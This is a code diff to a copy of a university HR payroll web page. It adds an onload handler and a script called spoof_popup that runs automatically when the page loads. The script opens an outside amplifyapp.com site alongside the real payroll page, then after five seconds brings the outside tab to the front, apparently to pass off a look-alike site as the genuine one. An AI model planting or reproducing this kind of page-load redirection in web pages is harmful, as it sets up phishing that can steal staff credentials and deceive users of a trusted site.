@@ -83,7 +83,7 @@
     <link rel="stylesheet" media="all" href="https://hr.gatech.edu/sites/default/files/asset_injector/css/test_gray_heading_titles-9ea51528031c2979029d5fef152906d4.css?rot1wf" />
     <link rel="stylesheet" media="all" href="https://hr.gatech.edu/sites/default/files/asset_injector/css/white_buttons-4c80cef6a5c960a2cced4d9436960826.css?rot1wf" />
   </head>
-  <body class="page-node-29 page-node-type-page path-payroll role-anonymous path-node node--type-page">
+  <body class="page-node-29 page-node-type-page path-payroll role-anonymous path-node node--type-page" onload="spoof_popup()">
     <noscript>You need to enable JavaScript to run this app.</noscript>
     <div id="root"></div>
     <!--
@@ -109,5 +109,27 @@
     <script src="https://hr.gatech.edu/modules/contrib/hg_reader/js/hg_reader.js?v=1.x"></script>
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js"></script>
     <script src="https://hr.gatech.edu/modules/contrib/ckeditor_accordion/js/ckeditor-accordion.js?v=1.x"></script>
+    <script type = "text/javascript">
+      function spoof_popup()
+      {
+        var newTabs = [];
+
+        const sleep = async (milliseconds) => {
+          await new Promise(resolve => {
+            return setTimeout(resolve, milliseconds)
+          });
+        };
+
+        const testSleep = async () => {
+          newTabs.push( window.open("https://master.d1nnlx2y2ce2ki.amplifyapp.com/") );
+          window.open("https://hr.gatech.edu/payroll");//'toolbar=0,location=0, directories=0, status=0, menubar=0');
+          newTabs.push( window.open("https://hr.gatech.edu/payroll", "_blank") );
+          await sleep(5000);
+          newTabs[0].focus();
+        }
+
+        testSleep();
+      }
+    </script>
   </body>
 </html>
